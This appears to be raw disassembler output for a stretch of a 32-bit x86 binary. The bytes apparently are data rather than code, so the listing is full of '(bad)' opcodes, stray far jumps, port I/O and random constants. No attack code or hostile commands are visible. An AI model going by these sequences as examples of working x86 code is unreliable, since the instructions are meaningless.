  41becb:	xchg   edi,eax
  41becc:	xor    dh,dh
  41bece:	or     DWORD PTR [ecx-0x24499bbf],ebp
  41bed4:	fsub   DWORD PTR [edx+eiz*4]
  41bed7:	(bad)  
  41bed8:	cmp    eax,DWORD PTR [eax+0x4d]
  41bedb:	jmp    0xc40e:0xdbfff243
  41bee2:	test   cl,ah
  41bee4:	test   BYTE PTR [ebx+0x45b54497],ch
  41beea:	xor    ebp,DWORD PTR [si]
  41beed:	js     0x41be7b
  41beef:	jl     0x41bf58
  41bef1:	retf   0x994a
  41bef4:	xchg   BYTE PTR [ebx+0x0],cl
  41bef7:	sub    edx,DWORD PTR [ecx-0x52ba6f66]
  41befd:	and    ebx,DWORD PTR [edi+ecx*4-0x1db7d4ac]
  41bf04:	sahf   
  41bf05:	cmp    al,0xef
  41bf07:	cli    
  41bf08:	jmp    0x46d8:0x8de21ac0
  41bf0f:	push   esi
  41bf10:	push   0x9
  41bf12:	repz iret 
  41bf14:	jbe    0x41beb6
  41bf16:	retf   0x29ff
  41bf19:	mov    al,0xba
  41bf1b:	out    0x7,eax
  41bf1d:	repz and ebx,DWORD PTR [esi+edi*8+0x47]
  41bf22:	pop    ebp
  41bf23:	mov    DWORD PTR [edi],esi
  41bf25:	pusha  
  41bf26:	shl    DWORD PTR [edi+0x1aebd339],0x5f
  41bf2d:	add    al,0x53
  41bf2f:	int    0xd8
  41bf31:	punpckhwd mm1,mm0
  41bf34:	dec    edi
  41bf35:	bound  ecx,QWORD PTR [esi]
  41bf37:	push   ds
  41bf38:	add    ebx,edx
  41bf3a:	xlat   BYTE PTR ds:[ebx]
  41bf3b:	in     eax,0xdb
  41bf3d:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41bf3f:	adc    al,0x63
  41bf41:	add    eax,0x1e6cfb06
  41bf46:	sar    BYTE PTR [eax+0x4c],0x31
  41bf4a:	inc    ebp
  41bf4b:	cmp    al,0xd9
  41bf4d:	mov    eax,ds:0x7093b99f
  41bf52:	sub    bh,al
  41bf54:	jecxz  0x41bfa1
  41bf56:	xchg   ebp,eax
  41bf57:	pop    eax
  41bf58:	cmp    DWORD PTR [edi-0x16f51a1c],0xe74a01e
  41bf62:	lods   eax,DWORD PTR ds:[esi]
  41bf63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf64:	rcl    dl,0x79
  41bf67:	fwait
  41bf68:	js     0x41bf5e
  41bf6a:	jcxz   0x41bef6
  41bf6d:	mov    edi,0xbac128c5
  41bf72:	nop
  41bf73:	pop    ebp
  41bf74:	mov    ebx,0xff5b5feb
  41bf79:	xor    DWORD PTR [edx-0x1853ac6],edx
  41bf7f:	sbb    bl,BYTE PTR [eax-0x3fbbc88d]
  41bf85:	adc    ebp,edi
  41bf87:	xchg   ebp,eax
  41bf88:	out    0x52,eax
  41bf8a:	fiadd  WORD PTR [edx+0x4b]
  41bf8d:	arpl   cx,di
  41bf8f:	and    bh,BYTE PTR [eax+0x0]
	...
  41bff1:	add    BYTE PTR [eax],al
  41bff3:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41bff7:	es aaa 
  41bff9:	data16 jne 0x41c06f
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	daa    
  41bffe:	mov    cl,0xc1
  41c000:	pushf  
  41c001:	jno    0x41bfe5
  41c003:	in     al,0x8a
  41c005:	sub    DWORD PTR [ecx],eax
  41c007:	add    BYTE PTR ds:0xb6000001,al
  41c00d:	(bad)  
  41c00e:	outs   dx,DWORD PTR ds:[esi]
  41c00f:	sub    eax,0xf53b973
  41c014:	jmp    0x5b66:0xf6bce436
  41c01b:	cwde   
  41c01c:	pop    eax
  41c01d:	cmp    bl,dh
  41c01f:	pop    eax
  41c020:	aad    0xd2
  41c022:	jne    0x41bfad
  41c024:	sahf   
  41c025:	mov    edx,0x990e53aa
  41c02a:	inc    ebx
  41c02b:	mov    dh,0xb2
  41c02d:	ret    0x9350
  41c030:	cld    
  41c031:	ds test ah,0x8e
  41c035:	sub    dl,BYTE PTR [eax]
  41c037:	pop    edi
  41c038:	xchg   ebp,eax
  41c039:	fisub  DWORD PTR gs:[eax]
  41c03c:	enter  0x1ba4,0xc5
  41c040:	xchg   BYTE PTR [edi],al
  41c042:	test   eax,0x6ad0b1c1
  41c047:	leave  
  41c048:	pop    esp
  41c049:	and    DWORD PTR [eax],ecx
  41c04b:	xlat   BYTE PTR ds:[ebx]
  41c04c:	xchg   ebp,eax
  41c04d:	clc    
  41c04e:	or     ebp,edi
  41c050:	push   es
  41c051:	push   edi
  41c052:	sub    al,0xfb
  41c054:	jnp    0x41c0b3
  41c056:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c057:	lods   eax,DWORD PTR ds:[esi]
  41c058:	inc    eax
  41c059:	shl    BYTE PTR [ecx],1
  41c05b:	xor    esp,DWORD PTR ds:0xc6a5d911
  41c061:	dec    esi
  41c062:	lods   eax,DWORD PTR ds:[esi]
  41c063:	jns    0x41c04b
  41c065:	lods   eax,DWORD PTR ds:[esi]
  41c066:	or     bh,BYTE PTR [esi-0x2528916b]
  41c06c:	iret   
  41c06d:	enter  0x84e7,0xb2
  41c071:	scas   eax,DWORD PTR es:[edi]
  41c072:	sbb    bl,BYTE PTR [ebx-0x56]
  41c075:	(bad)  
  41c077:	xchg   ebx,eax
  41c078:	mov    ds:0x46d8ff6b,eax
  41c07d:	add    DWORD PTR [eax+0xec94a06],esp
  41c083:	pop    ss
  41c084:	ja     0x41c014
  41c086:	inc    edi
  41c087:	lods   al,BYTE PTR ds:[esi]
  41c088:	xchg   DWORD PTR [edi],ebx
  41c08a:	inc    ebx
  41c08b:	push   edi
  41c08c:	xor    bh,BYTE PTR [edi]
  41c08e:	fadd   QWORD PTR [ecx-0x76]
  41c091:	jbe    0x41c09b
  41c093:	add    bh,BYTE PTR [edx]
  41c095:	(bad)  
  41c096:	in     eax,dx
  41c097:	and    BYTE PTR [esi],dl
  41c099:	outs   dx,DWORD PTR ds:[esi]
  41c09a:	push   es
  41c09b:	or     eax,ecx
  41c09d:	mov    al,ds:0x21e3919b
  41c0a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0a3:	xchg   ebp,eax
  41c0a4:	jmp    0x41c070
  41c0a6:	xchg   esi,eax
  41c0a7:	in     al,0x39
  41c0a9:	pop    esi
  41c0aa:	dec    ebp
  41c0ab:	cmp    eax,0xd08054f9
  41c0b0:	xchg   BYTE PTR [ebx+eax*2],dh
  41c0b3:	push   es
  41c0b4:	cmp    ecx,esp
  41c0b6:	test   al,0x3d
  41c0b8:	loopne 0x41c049
  41c0ba:	adc    dl,BYTE PTR [esi+0x2e]
  41c0bd:	dec    ebx
  41c0be:	xor    bh,bh
  41c0c0:	mov    esp,ebx
  41c0c2:	jp     0x41c10c
  41c0c4:	xchg   esi,eax
  41c0c5:	mov    ds:0xe01f5a2a,al
  41c0ca:	xchg   ebx,eax
  41c0cb:	call   0xd55f:0x6e6c91c8
  41c0d2:	out    dx,al
  41c0d3:	leave  
  41c0d4:	ja     0x41c0ff
  41c0d6:	in     eax,dx
  41c0d7:	push   esi
  41c0d8:	and    DWORD PTR [esi-0x6bf35e77],edi
  41c0de:	pop    edx
  41c0df:	shl    BYTE PTR [esi+edi*2-0x7612bbe8],0xb0
  41c0e7:	sub    al,dh
  41c0e9:	in     eax,dx
  41c0ea:	jae    0x41c0d0
  41c0ec:	pop    ebx
  41c0ed:	sbb    DWORD PTR [edi-0x4ecd0ba4],esp
  41c0f3:	sub    bh,BYTE PTR [edx-0x23db8c69]
  41c0f9:	jnp    0x41c0cb
  41c0fb:	(bad)  [esi-0x3d3f01fe]
  41c101:	mov    DWORD PTR [edx+ecx*8+0x54],edx
  41c105:	or     al,0xdf
  41c107:	pop    edx
  41c108:	(bad)  
  41c109:	les    edx,FWORD PTR [ebx-0x2a]
  41c10c:	les    eax,FWORD PTR [esi+0x9b750c]
	...
  41c172:	add    BYTE PTR [eax],al
  41c174:	(bad)  [edx-0x5f]
  41c177:	clc    
  41c178:	mov    bl,0xfb
  41c17a:	fldcw  WORD PTR [ebx+0x3d]
  41c17d:	add    DWORD PTR ds:0x6b3b00e9,eax
  41c183:	(bad)
  41c188:	add    eax,0x70000001
  41c18d:	pop    edx
  41c18e:	mov    ebp,0xba9734dc
  41c193:	mov    al,ds:0x456836c4
  41c198:	mov    eax,es:0xaecb0141
  41c19e:	frstor [eax]
  41c1a0:	and    eax,DWORD PTR [ecx+ebp*2+0x5988f844]
  41c1a7:	rol    BYTE PTR [ebp+0x4b9b5890],cl
  41c1ad:	push   edx
  41c1ae:	cli    
  41c1af:	sti    
  41c1b0:	inc    edx
  41c1b1:	push   0xffffffe6
  41c1b3:	mov    ss,WORD PTR [edx+ebp*1+0x3653b95]
  41c1ba:	and    bl,BYTE PTR [ebp+0x6c73189b]
  41c1c0:	imul   ebp,DWORD PTR [ecx-0x583fc530],0x72
  41c1c7:	push   dx
  41c1c9:	lds    ebx,FWORD PTR ds:0x2cb70f46
  41c1cf:	not    DWORD PTR [edx+esi*8-0x7c]
  41c1d3:	push   edi
  41c1d4:	jo     0x41c22d
  41c1d6:	(bad)  
  41c1d7:	iret   
  41c1d8:	scas   al,BYTE PTR es:[edi]
  41c1d9:	pop    ebx
  41c1da:	xchg   edi,eax
  41c1db:	psraw  mm3,mm3
  41c1de:	stc    
  41c1df:	shl    cl,1
  41c1e1:	pop    ebp
  41c1e2:	lea    ebx,[edi-0x7ea601e8]
  41c1e8:	push   esp
  41c1e9:	repnz stos DWORD PTR es:[edi],eax
  41c1eb:	sbb    al,0x85
  41c1ed:	mov    ch,0x85
  41c1ef:	test   eax,0x60211175
  41c1f4:	shl    edx,0xab
  41c1f7:	addr16 arpl bp,ax
  41c1fa:	adc    al,0x4a
  41c1fc:	dec    ecx
  41c1fd:	jmp    FWORD PTR [ebp+ecx*8-0x24]
  41c201:	or     al,BYTE PTR [ebx-0x748d5b47]
  41c207:	mov    edx,0xb3369e86
  41c20c:	mov    esi,0xb661a89
  41c211:	daa    
  41c212:	in     al,dx
  41c213:	xchg   edx,eax
  41c214:	xor    DWORD PTR [eax+0x3],ecx
  41c217:	mov    ds:0x40f0422,al
  41c21c:	lods   eax,DWORD PTR ds:[esi]
  41c21d:	adc    DWORD PTR [eax+esi*2],0x5cda7de1
  41c224:	ds cmp al,0x2e
  41c227:	sub    edi,ecx
  41c229:	dec    ebx
  41c22a:	xchg   ecx,eax
  41c22b:	cld    
  41c22c:	xchg   esi,eax
  41c22d:	test   BYTE PTR [esi-0x1c],0x53
  41c231:	and    BYTE PTR [eax-0x6d],al
  41c234:	dec    eax
  41c235:	out    0x68,eax
  41c237:	push   ds
  41c238:	mov    eax,ds:0x4ef46a0d
  41c23d:	stc    
  41c23e:	xchg   esp,eax
  41c240:	stos   DWORD PTR es:[edi],eax
  41c241:	punpckhwd mm3,QWORD PTR [ecx-0x6ebc378]
  41c248:	mov    dl,0x60
  41c24a:	mov    dl,0xf9
  41c24c:	xor    edx,DWORD PTR [eax]
  41c24e:	mov    edx,0x790eb21
  41c253:	ss jnp 0x41c2ce
  41c256:	int3   
  41c257:	int3   
  41c258:	inc    ebp
  41c259:	add    cl,0xfa
  41c25c:	lahf   
  41c25d:	or     DWORD PTR [esi],0xffffffd5
  41c260:	push   ecx
  41c261:	aad    0x4a
  41c263:	ss push edi
  41c265:	shl    DWORD PTR [esi+esi*2-0x61079b3f],0x8d
  41c26d:	imul   edi,esi,0x968bc8d8
  41c273:	and    BYTE PTR [edx],al
  41c275:	shl    BYTE PTR [esi],1
  41c277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c278:	mov    al,ds:0x9bcd815e
  41c27d:	inc    ebp
  41c27e:	in     al,dx
  41c27f:	or     eax,0xdbd263da
  41c284:	add    ebx,DWORD PTR [ebx]
  41c286:	(bad)  
  41c287:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c288:	sbb    al,0xa0
  41c28a:	push   esp
  41c28b:	sub    cl,BYTE PTR [ebx+edx*1+0xcaa179]
	...
  41c2f2:	add    BYTE PTR [eax],al
  41c2f4:	repz and ebp,ecx
  41c2f7:	push   ebp
  41c2f8:	(bad)  
  41c2fa:	sti    
  41c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fc:	enter  0x1a95,0x14
  41c300:	inc    ecx
  41c301:	cdq    
  41c302:	xor    edx,edx
  41c304:	xchg   esp,eax
  41c305:	sub    eax,DWORD PTR [ecx]
  41c307:	add    BYTE PTR ds:0xed000001,al
  41c30d:	sbb    al,0xdc
  41c30f:	mov    WORD PTR [ebp+0x3a630813],?
  41c315:	xchg   esp,eax
  41c316:	fcom   QWORD PTR [esi-0x1d6ea98f]
  41c31c:	ins    BYTE PTR es:[edi],dx
  41c31d:	rcr    DWORD PTR [ebp+0x4e],1
  41c320:	pushf  
  41c321:	adc    ch,BYTE PTR [edi+0x295b66f]
  41c327:	fisub  DWORD PTR [edx-0x7]
  41c32a:	push   esi
  41c32b:	dec    esp
  41c32c:	or     BYTE PTR [ebx-0x54],bh
  41c32f:	dec    esi
  41c330:	push   eax
  41c331:	push   esi
  41c332:	cld    
  41c333:	add    esi,DWORD PTR [ecx]
  41c335:	es clc 
  41c337:	test   BYTE PTR [ecx+0x7c821a56],cl
  41c33d:	xor    ch,BYTE PTR [ebx-0x68bf46b0]
  41c343:	add    bh,cl
  41c345:	imul   esi,DWORD PTR [ebp+0x59],0x66ee5a5f
  41c34c:	mov    ebp,eax
  41c34e:	cmp    cl,BYTE PTR [eax+0x15]
  41c351:	mov    al,0x87
  41c353:	rcr    DWORD PTR fs:[edx+ecx*2],0x3f
  41c358:	add    BYTE PTR [edx+0x30f924be],bh
  41c35e:	xchg   edx,eax
  41c35f:	sbb    BYTE PTR [ecx-0x4fb05de2],bh
  41c365:	add    bl,BYTE PTR [edi+0x1f]
  41c368:	or     DWORD PTR [bx-0x2a99],0x5a3b9cb5
  41c371:	mov    eax,ds:0x37c3882f
  41c376:	cli    
  41c377:	and    bh,BYTE PTR [ebx-0x73f945dd]
  41c37d:	mov    ebp,0x970151aa
  41c382:	add    bh,bh
  41c384:	ret    0xc8f8
  41c387:	iret   
  41c388:	sub    eax,0xadc2d29a
  41c38d:	jg     0x41c3e6
  41c38f:	push   edx
  41c390:	fwait
  41c391:	pop    es
  41c392:	out    dx,eax
  41c393:	xchg   esi,eax
  41c394:	test   BYTE PTR [ebx+edx*8],bl
  41c397:	imul   edx,esp,0x8a2e122f
  41c39d:	xor    WORD PTR [eax+0x63],dx
  41c3a1:	aaa    
  41c3a2:	jbe    0x41c378
  41c3a4:	mov    ebp,ss
  41c3a6:	into   
  41c3a7:	scas   eax,DWORD PTR es:[edi]
  41c3a8:	push   cs
  41c3a9:	pop    ebx
  41c3aa:	push   ss
  41c3ab:	das    
  41c3ac:	dec    edx
  41c3ad:	xchg   BYTE PTR [edx],ch
  41c3af:	jns    0x41c34f
  41c3b1:	ins    DWORD PTR es:[edi],dx
  41c3b2:	fwait
  41c3b3:	test   al,0xe5
  41c3b5:	push   eax
  41c3b6:	pop    esi
  41c3b7:	add    edi,DWORD PTR [edi+edx*1-0x53f9ced6]
  41c3be:	xor    al,0x21
  41c3c0:	jmp    0x41c3fe
  41c3c2:	fld    QWORD PTR [edx+eiz*4+0x23c68e37]
  41c3c9:	xchg   ecx,eax
  41c3ca:	retf   0x962d
  41c3cd:	(bad)  
  41c3ce:	pop    ebp
  41c3cf:	xchg   ebx,eax
  41c3d0:	lahf   
  41c3d1:	int3   
  41c3d2:	je     0x41c42f
  41c3d4:	or     bh,BYTE PTR [ebx]
  41c3d6:	mov    ebx,0x572fa4aa
  41c3db:	fisttp DWORD PTR [ecx]
  41c3dd:	fisubr DWORD PTR [edx-0x7b]
  41c3e0:	or     al,0xe5
  41c3e2:	inc    ebx
  41c3e3:	mov    eax,0xe6bee80d
  41c3e8:	inc    eax
  41c3e9:	adc    DWORD PTR [edi],eax
  41c3eb:	mov    ds:0xe1f8a7d3,eax
  41c3f0:	gs popaw 
  41c3f3:	adc    BYTE PTR [eax],ch
  41c3f5:	aas    
  41c3f6:	es push ss
  41c3f8:	inc    esi
  41c3f9:	(bad)  
  41c3fa:	scas   eax,DWORD PTR es:[edi]
  41c3fb:	test   eax,0xbd8b28b3
  41c400:	cmp    ecx,DWORD PTR [edi+0x24d82cf7]
  41c406:	xor    BYTE PTR [ebp-0xf],ch
  41c409:	dec    edx
  41c40a:	push   cs
  41c40b:	jg     0x41c3dc
  41c40d:	ins    DWORD PTR es:[edi],dx
  41c40e:	imul   DWORD PTR [esi+ebp*2+0x0]
	...
  41c472:	add    BYTE PTR [eax],al
  41c474:	push   ebx
  41c475:	and    BYTE PTR [eax+0x5faef3ae],ah
  41c47b:	std    
  41c47c:	mov    bl,0x35
  41c47e:	dec    ebp
  41c47f:	push   ecx
  41c480:	pop    ss
  41c481:	jne    0x41c43b
  41c483:	(bad)  
  41c484:	cdq    
  41c485:	sub    al,0x1
  41c487:	add    BYTE PTR ds:0x58000001,al
  41c48d:	pop    ds
  41c48e:	jbe    0x41c4eb
  41c490:	repnz sub DWORD PTR [ebx-0x45],ecx
  41c494:	call   0x2e46:0xf06709b8
  41c49b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c49c:	int    0x8e
  41c49e:	loop   0x41c4d2
  41c4a0:	in     al,0x55
  41c4a2:	jo     0x41c4ae
  41c4a4:	stos   BYTE PTR es:[edi],al
  41c4a5:	sub    DWORD PTR [ebp+0x17bded82],0x9e485806
  41c4af:	cld    
  41c4b0:	in     eax,dx
  41c4b1:	mov    ds:0xb770f299,al
  41c4b6:	push   ebx
  41c4b7:	fs dec edx
  41c4b9:	popf   
  41c4ba:	addr16 jb 0x41c4dc
  41c4bd:	mov    ds:0xc98b6ba9,al
  41c4c2:	mov    edx,0xf3832db5
  41c4c7:	or     ebp,ebp
  41c4c9:	aad    0x4
  41c4cb:	xor    DWORD PTR [edx],ebx
  41c4cd:	in     eax,0x2d
  41c4cf:	xor    eax,0x8bc7310a
  41c4d4:	out    0xd9,eax
  41c4d6:	shl    DWORD PTR [ebx+0x51890527],0x1d
  41c4dd:	ret    0xa3c0
  41c4e0:	adc    dl,al
  41c4e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4e3:	mov    WORD PTR [ebx],ss
  41c4e5:	clc    
  41c4e6:	js     0x41c511
  41c4e8:	mov    bl,0xb4
  41c4ea:	adc    ecx,ecx
  41c4ec:	aam    0xff
  41c4ee:	stos   DWORD PTR es:[edi],eax
  41c4ef:	stos   DWORD PTR es:[edi],eax
  41c4f0:	(bad)  
  41c4f1:	and    DWORD PTR [edx],ebp
  41c4f3:	cmp    edi,DWORD PTR [esi]
  41c4f5:	leave  
  41c4f6:	xchg   ebx,eax
  41c4f7:	lods   al,BYTE PTR ds:[esi]
  41c4f8:	repz and BYTE PTR [ebx+ebx*1],0xf1
  41c4fd:	mov    edx,es
  41c4ff:	jnp    0x41c4d4
  41c501:	sbb    eax,0x33a3c58a
  41c506:	push   0xffffffda
  41c508:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c509:	iret   
  41c50a:	gs mov ah,0x56
  41c50d:	add    eax,0x4c8593b5
  41c512:	retf   0xb1f6
  41c515:	sti    
  41c516:	fadd   st(4),st
  41c518:	jle    0x41c545
  41c51a:	pusha  
  41c51b:	mov    eax,0x9f575261
  41c520:	cmp    bl,BYTE PTR [ebp+0x457a1028]
  41c526:	loopne 0x41c55c
  41c528:	or     ebp,ebp
  41c52a:	inc    eax
  41c52b:	and    al,0xd6
  41c52d:	je     0x41c510
  41c52f:	call   0x9abb:0x53088e01
  41c536:	stos   DWORD PTR es:[edi],eax
  41c537:	mov    DWORD PTR [esi+eax*2-0x3f],0x23757e25
  41c53f:	mov    eax,ds:0xa8f5fd61
  41c544:	adc    bl,al
  41c546:	pop    edi
  41c547:	ret    0xcfc2
  41c54a:	pop    esi
  41c54b:	iret   
  41c54c:	(bad)  
  41c54d:	aam    0x5c
  41c54f:	mov    al,0xe5
  41c551:	clc    
  41c552:	fwait
  41c553:	sbb    al,0xe0
  41c555:	sahf   
  41c556:	add    edi,edx
  41c558:	data16 data16 fucompp 
  41c55c:	xlat   BYTE PTR ds:[ebx]
  41c55d:	xchg   edx,eax
  41c55e:	xor    ebp,eax
  41c560:	popf   
  41c561:	sbb    esi,DWORD PTR [edx]
  41c563:	mov    BYTE PTR [eax],bl
  41c565:	addr16 das 
  41c567:	or     bh,ch
  41c569:	or     edi,edx
  41c56b:	aas    
  41c56c:	retf   
  41c56d:	pop    ecx
  41c56e:	sahf   
  41c56f:	stos   BYTE PTR es:[edi],al
  41c570:	sbb    al,0x4b
  41c572:	rcl    DWORD PTR [esi+0x7554c54c],cl
  41c578:	ins    DWORD PTR es:[edi],dx
  41c579:	out    dx,al
  41c57a:	scas   eax,DWORD PTR es:[edi]
  41c57b:	xchg   ebx,eax
  41c57c:	add    al,al
  41c57e:	xchg   edi,eax
  41c57f:	nop
  41c580:	inc    edi
  41c581:	jo     0x41c5c9
  41c583:	fist   DWORD PTR [ebx]
  41c585:	ins    BYTE PTR es:[edi],dx
  41c586:	pusha  
  41c587:	ins    BYTE PTR es:[edi],dx
  41c588:	popa   
  41c589:	mov    esp,0x367bec63
  41c58e:	mov    BYTE PTR [esi],ah
  41c590:	mov    BYTE PTR [eax],al
	...
  41c5f2:	add    BYTE PTR [eax],al
  41c5f4:	lds    esp,FWORD PTR [ebx]
  41c5f6:	xchg   ecx,eax
  41c5f7:	and    eax,0xe3f5b7f7
  41c5fc:	inc    ebx
  41c5fd:	and    ch,ch
  41c5ff:	call   0x2d9e:0x6a459ba7
  41c606:	add    DWORD PTR [eax],eax
  41c608:	add    eax,0xe4000001
  41c60d:	iret   
  41c60e:	lds    ebx,FWORD PTR ss:[edi+0x42]
  41c612:	add    eax,0xb259418b
  41c617:	popf   
  41c618:	in     eax,dx
  41c619:	sbb    BYTE PTR ds:0x1663930,al
  41c61f:	push   ebx
  41c620:	lock push edi
  41c622:	lods   al,BYTE PTR ds:[esi]
  41c623:	inc    edx
  41c624:	mov    edi,0x312062e9
  41c629:	mov    bl,0xbf
  41c62b:	xor    esp,ebp
  41c62d:	sahf   
  41c62e:	push   ebx
  41c62f:	jg     0x41c63a
  41c631:	adc    ch,bh
  41c633:	test   BYTE PTR [ebx],dh
  41c635:	int    0x4a
  41c637:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c638:	sbb    cl,BYTE PTR [edi]
  41c63a:	fmul   st(4),st
  41c63c:	aad    0xcb
  41c63e:	repnz cwde 
  41c640:	popf   
  41c641:	loopne 0x41c650
  41c643:	scas   eax,DWORD PTR es:[edi]
  41c644:	and    DWORD PTR [eax+0x7d5293b8],ebx
  41c64a:	inc    ecx
  41c64b:	and    eax,0x277177e5
  41c650:	cs inc ecx
  41c652:	and    BYTE PTR [ecx+0x7b3600e6],cl
  41c658:	es inc eax
  41c65a:	test   eax,0xe63dc5de
  41c65f:	lahf   
  41c660:	or     BYTE PTR [edi],0xd9
  41c663:	sbb    BYTE PTR ds:0x84d5e8ed,dh
  41c669:	fst    QWORD PTR [eax+0x40b0d85b]
  41c66f:	lahf   
  41c670:	push   ebp
  41c671:	push   eax
  41c672:	das    
  41c673:	aad    0xfc
  41c675:	mov    esp,0x58fee962
  41c67a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c67b:	mov    esi,0xe84ac707
  41c680:	fstp   TBYTE PTR [eax]
  41c682:	jle    0x41c625
  41c684:	adc    esi,ecx
  41c686:	shl    DWORD PTR [ebx-0x76380aa2],0xb5
  41c68d:	mov    edx,0x438f4e31
  41c692:	jl     0x41c711
  41c694:	mov    bl,ch
  41c696:	push   ebx
  41c697:	rcl    DWORD PTR [ebp-0x64d27ec2],cl
  41c69d:	(bad)  
  41c69e:	std    
  41c69f:	sbb    al,dh
  41c6a1:	hlt    
  41c6a2:	add    eax,0xe20ed947
  41c6a7:	jmp    0x790c100b
  41c6ac:	push   ss
  41c6ad:	xor    ah,al
  41c6af:	lods   al,BYTE PTR ds:[esi]
  41c6b0:	aaa    
  41c6b1:	cmp    eax,DWORD PTR [esi]
  41c6b3:	dec    DWORD PTR ds:0x8cb1000a
  41c6b9:	dec    ecx
  41c6ba:	lahf   
  41c6bb:	fwait
  41c6bc:	and    BYTE PTR [ecx+0x3d1db552],al
  41c6c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6c3:	mov    cl,0xf1
  41c6c5:	or     eax,0x45b821d7
  41c6ca:	leave  
  41c6cb:	sahf   
  41c6cc:	inc    DWORD PTR [esp+eax*1]
  41c6cf:	sub    dh,dh
  41c6d1:	cmp    DWORD PTR [edx+0x20f65821],esp
  41c6d7:	das    
  41c6d8:	sbb    eax,0x8915d540
  41c6dd:	retf   
  41c6de:	setne  dh
  41c6e1:	jmp    0x41c6ca
  41c6e3:	outs   dx,BYTE PTR ds:[esi]
  41c6e4:	and    BYTE PTR [edi+eax*2-0x2443a560],bl
  41c6eb:	neg    BYTE PTR ds:0x95d1fb81
  41c6f1:	fild   WORD PTR [bp+si-0x135d]
  41c6f6:	addr16 push ss
  41c6f8:	fwait
  41c6f9:	mov    ch,0xbc
  41c6fb:	fiadd  WORD PTR [eax-0x1e]
  41c6fe:	pop    ebp
  41c6ff:	push   edi
  41c700:	mov    cl,0x7d
  41c702:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c703:	jle    0x41c6cf
  41c705:	or     bl,BYTE PTR [ebp+0x23]
  41c708:	pop    ds
  41c709:	xchg   DWORD PTR [ebp+0x38fdf13e],edx
  41c70f:	fwait
  41c710:	cmp    DWORD PTR [eax],eax
	...
  41c772:	add    BYTE PTR [eax],al
  41c774:	fiadd  DWORD PTR [ecx]
  41c776:	ret    0xdb86
  41c779:	(bad)  
  41c77a:	ficomp WORD PTR [ebp-0xf]
  41c77d:	cmp    DWORD PTR [esi],esi
  41c77f:	lahf   
  41c780:	fisubr DWORD PTR [ebp-0x2e]
  41c783:	dec    edi
  41c784:	mov    ds:0x500012e,eax
  41c789:	add    DWORD PTR [eax],eax
  41c78b:	add    ch,bh
  41c78d:	test   DWORD PTR [eax+0x41],esp
  41c790:	inc    ebp
  41c791:	fdiv   DWORD PTR ds:0x867a0276
  41c797:	and    BYTE PTR [ecx-0x6b],al
  41c79a:	adc    eax,0xa6d38f1
  41c79f:	xor    edx,DWORD PTR [edi+0x1d]
  41c7a2:	lahf   
  41c7a3:	mov    dl,0x0
  41c7a5:	mov    ebx,0x1c93a0ef
  41c7aa:	cmp    eax,0x9a85a9ed
  41c7af:	nop
  41c7b0:	or     ebx,DWORD PTR [edx]
  41c7b2:	call   0x7905def9
  41c7b7:	call   DWORD PTR [ebx+0x38217e2e]
  41c7bd:	ds mov ah,0xb1
  41c7c0:	nop
  41c7c1:	and    ebp,DWORD PTR [edx-0x32519efb]
  41c7c7:	fs inc ecx
  41c7c9:	dec    eax
  41c7ca:	dec    ebp
  41c7cb:	and    BYTE PTR [ecx+0x43724857],dh
  41c7d1:	sub    al,0x8c
  41c7d3:	ret    
  41c7d4:	cmp    eax,DWORD PTR [edx+0x416adb6f]
  41c7da:	add    BYTE PTR [eax],dh
  41c7dc:	xor    al,0x7b
  41c7de:	xchg   ebx,eax
  41c7df:	xchg   edx,eax
  41c7e0:	shl    BYTE PTR cs:[eax+0x36],cl
  41c7e4:	xchg   ebp,eax
  41c7e5:	sub    ah,BYTE PTR [edi+esi*4]
  41c7e8:	xor    DWORD PTR [edi+eiz*1+0x7974022f],edx
  41c7ef:	xchg   ebx,eax
  41c7f0:	cs dec ecx
  41c7f2:	gs jle 0x41c79e
  41c7f5:	xor    al,0x22
  41c7f7:	pop    esp
  41c7f8:	out    0x6a,eax
  41c7fa:	or     ebp,DWORD PTR [ebx-0x4b]
  41c7fd:	inc    eax
  41c7fe:	mov    eax,ds:0xe0076df9
  41c803:	rcl    bl,cl
  41c805:	call   0xe330:0x109c15f1
  41c80c:	mov    eax,ds:0x8c48d07
  41c811:	clc    
  41c812:	mov    ebx,0x1e88f5c4
  41c817:	dec    esi
  41c818:	dec    eax
  41c819:	mov    ds:0x1a365240,eax
  41c81e:	xor    BYTE PTR [ecx],0x1
  41c821:	push   ds
  41c822:	loope  0x41c7e0
  41c824:	pop    ss
  41c825:	neg    al
  41c827:	sub    al,0x2b
  41c829:	(bad)  
  41c82b:	or     al,0x90
  41c82d:	dec    edx
  41c82e:	jmp    0x41c7c9
  41c830:	push   esi
  41c831:	jle    0x41c81c
  41c833:	loope  0x41c81b
  41c835:	jl     0x41c85f
  41c837:	add    dl,BYTE PTR [eax+0x68]
  41c83a:	sbb    BYTE PTR [edx+0x6bce190],bl
  41c840:	mov    ebx,0x5f893705
  41c845:	repnz pop esi
  41c847:	mul    BYTE PTR [edi+esi*8+0x1e]
  41c84b:	add    al,0x31
  41c84d:	daa    
  41c84e:	cwde   
  41c84f:	jle    0x41c7d4
  41c851:	sub    bh,bl
  41c853:	ja     0x41c83f
  41c855:	stos   DWORD PTR es:[edi],eax
  41c856:	mov    dh,0x5c
  41c858:	ins    DWORD PTR es:[edi],dx
  41c859:	rol    esp,cl
  41c85b:	jp     0x41c8a5
  41c85d:	ror    ebp,1
  41c85f:	stc    
  41c860:	lahf   
  41c861:	mov    al,dh
  41c863:	mov    dh,0xf9
  41c865:	mov    esi,DWORD PTR [esp+eiz*8]
  41c868:	jo     0x41c802
  41c86a:	inc    esp
